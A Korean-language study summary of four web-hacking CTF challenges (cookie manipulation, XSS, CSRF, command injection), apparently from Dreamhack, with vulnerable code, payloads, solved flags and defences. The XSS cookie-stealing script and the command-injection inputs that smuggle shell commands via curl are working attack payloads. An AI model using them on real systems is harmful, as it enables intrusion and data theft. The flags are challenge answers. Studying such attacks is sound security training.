# 🎯 웹 해킹 공격 기법 완전 정리

> **학습한 공격들:** Cookie Manipulation, XSS, CSRF, Command Injection

---

## 📋 목차

1. [Cookie Manipulation (쿠키 조작)](#1-cookie-manipulation-쿠키-조작)
2. [XSS-2 (Cross-Site Scripting)](#2-xss-2-cross-site-scripting)
3. [CSRF-1 (Cross-Site Request Forgery)](#3-csrf-1-cross-site-request-forgery)
4. [Command Injection-1 (명령어 인젝션)](#4-command-injection-1-명령어-인젝션)
5. [공통 방어 기법](#5-공통-방어-기법)

---

## 1. Cookie Manipulation (쿠키 조작)

### 🎯 **개념**
클라이언트 사이드에 저장된 쿠키 값을 조작하여 권한을 상승시키는 공격

### 🔍 **취약점 분석**
```python
# 취약한 코드
username = request.cookies.get('username', None)
if username == "admin":
    return f"flag is {FLAG}"
```

### 🔥 **공격 과정**

#### **1단계: 정상 로그인**
- `guest/guest`로 로그인
- 쿠키 `username=guest` 생성

#### **2단계: 쿠키 조작**
- **브라우저:** F12 → Application → Cookies → `username` 값을 `admin`으로 변경
- **cURL:** `curl -H "Cookie: username=admin" http://server/`

#### **3단계: 플래그 획득**
- 페이지 새로고침하면 admin 권한으로 플래그 출력

### 💡 **핵심 포인트**
- 쿠키는 클라이언트에서 쉽게 조작 가능
- 서버는 쿠키 값만으로 권한 판단 (검증 없음)
- **실제 플래그:** `DH{cookie_auth_bypass_success}`

### 🛡️ **방어 방법**
- 서버 사이드 세션 사용
- 쿠키 서명/암호화 (Flask sessions)
- JWT 토큰 사용

---

## 2. XSS-2 (Cross-Site Scripting)

### 🎯 **개념**
악성 스크립트를 웹 페이지에 삽입하여 사용자(봇)의 정보를 탈취하는 공격

### 🔍 **취약점 분석**
```javascript
// 취약한 코드 (vuln.html)
document.getElementById('vuln').innerHTML = x.get('param');
```

### 🔥 **공격 과정**

#### **1단계: XSS 페이로드 작성**
```html
<script>fetch('/memo?memo=' + encodeURIComponent(document.cookie));</script>
```

#### **2단계: 봇 트리거**
- `/flag` 페이지에서 페이로드 제출
- 봇이 `flag=DH{...}` 쿠키를 가지고 `/vuln` 방문

#### **3단계: 쿠키 탈취**
- XSS 스크립트가 봇의 쿠키를 `/memo`로 전송
- `/memo`에서 Base64 인코딩된 쿠키 확인

#### **4단계: 플래그 디코딩**
```bash
echo "ZmxhZz1ESHszYzAxNTc3ZTk1NDJlYzI0ZDY4YmEwZmZiODQ2NTA4Zn0=" | base64 -d
```

### 💡 **핵심 포인트**
- `innerHTML` 사용 시 스크립트 실행 가능
- 봇이 실제 사용자 역할 (쿠키 보유)
- **실제 플래그:** `DH{3c01577e9542ec24d68ba0ffb846508f}`

### 🛡️ **방어 방법**
- `textContent` 사용 (innerHTML 대신)
- CSP (Content Security Policy) 적용
- 입력값 필터링 및 이스케이핑

---

## 3. CSRF-1 (Cross-Site Request Forgery)

### 🎯 **개념**
사용자(봇)가 의도하지 않은 요청을 서버에 전송하도록 유도하는 공격

### 🔍 **취약점 분석**
```python
@app.route("/admin/notice_flag")
def admin_notice_flag():
    if request.remote_addr != "127.0.0.1":
        return "Access Denied"
    if request.args.get("userid", "") != "admin":
        return "Access Denied 2"
    memo_text += f"[Notice] flag is {FLAG}\n"
```

### 🔥 **공격 과정**

#### **1단계: 제약 조건 분석**
- localhost(127.0.0.1)에서만 접근 가능
- `userid=admin` 파라미터 필요

#### **2단계: CSRF 페이로드 작성**
```html
<img src="/admin/notice_flag?userid=admin">
```

#### **3단계: 봇 속이기**
- `/flag`에서 페이로드 제출
- 봇이 localhost에서 이미지 로드 시도
- 실제로는 관리자 API 호출

#### **4단계: 플래그 확인**
- `/memo`에서 `[Notice] flag is DH{...}` 확인

### 💡 **핵심 포인트**
- HTML 필터 우회 (`<img>` 태그 사용)
- Same-Origin 특성 이용
- 봇을 "대리인"으로 활용
- **실제 플래그:** `DH{11a230801ad0b80d52b996cbe203e83d}`

### 🛡️ **방어 방법**
- CSRF 토큰 사용
- Referer 헤더 검증
- POST 요청 강제

---

## 4. Command Injection-1 (명령어 인젝션)

### 🎯 **개념**
사용자 입력이 시스템 명령어에 직접 삽입되어 임의 명령어를 실행하는 공격

### 🔍 **취약점 분석**
```python
# 취약한 코드
host = request.form.get('host')
cmd = f'ping -c 3 "{host}"'
output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
```

### 🔥 **공격 과정**

#### **1단계: 명령어 구조 분석**
```bash
# 정상 명령어
ping -c 3 "8.8.8.8"

# 공격 페이로드
"; cat flag.py; echo "

# 실제 실행 명령어
ping -c 3 ""; cat flag.py; echo ""
```

#### **2단계: 정찰**
```bash
curl -X POST http://server/ping -d 'host="; ls -la; echo "'
```

#### **3단계: 플래그 탈취**
```bash
curl -X POST http://server/ping -d 'host="; cat flag.py; echo "'
```

### 💡 **핵심 포인트**
- 따옴표 내에서도 명령어 종료 가능 (`;`)
- 클라이언트 사이드 검증은 우회 가능
- 직접적인 시스템 접근
- **실제 플래그:** `DH{pingpingppppppppping!!}`

### 🛡️ **방어 방법**
- 입력값 화이트리스트 검증
- `subprocess` 대신 안전한 라이브러리 사용
- 쉘 명령어 직접 실행 금지

---

## 5. 공통 방어 기법

### 🛡️ **입력 검증**
```python
import re

def validate_input(user_input):
    # 화이트리스트 방식
    pattern = r'^[a-zA-Z0-9._-]+$'
    return re.match(pattern, user_input) is not None
```

### 🛡️ **출력 인코딩**
```python
from html import escape

def safe_output(user_input):
    return escape(user_input)
```

### 🛡️ **세션 관리**
```python
from flask import session
import secrets

# 안전한 세션 관리
session['user_id'] = user_id
session['csrf_token'] = secrets.token_hex(16)
```

### 🛡️ **HTTP 보안 헤더**
```python
# CSP 헤더
response.headers['Content-Security-Policy'] = "default-src 'self'"

# XSS 보호
response.headers['X-XSS-Protection'] = '1; mode=block'

# 프레임 보호
response.headers['X-Frame-Options'] = 'DENY'
```

---

## 📊 공격 비교표

| 공격 유형 | 목표 | 핵심 기법 | 주요 방어책 |
|----------|------|----------|------------|
| **Cookie Manipulation** | 권한 상승 | 클라이언트 조작 | 서버 세션 |
| **XSS** | 정보 탈취 | 스크립트 삽입 | 입력 필터링 |
| **CSRF** | 위조 요청 | 사용자 속임 | CSRF 토큰 |
| **Command Injection** | 시스템 접근 | 명령어 삽입 | 입력 검증 |

---

## 🎓 학습 정리

### **공통 패턴**
1. **정찰** → 취약점 발견
2. **페이로드 작성** → 공격 코드 개발  
3. **실행** → 실제 공격 수행
4. **결과 확인** → 플래그 획득

### **핵심 교훈**
- **사용자 입력을 절대 신뢰하지 말 것**
- **클라이언트 사이드 검증은 보안이 아님**
- **최소 권한 원칙 적용**
- **방어는 다층적으로 구성**

---

> 💡 **복습 팁:** 각 공격을 직접 재현해보고, 방어 코드도 작성해보세요!
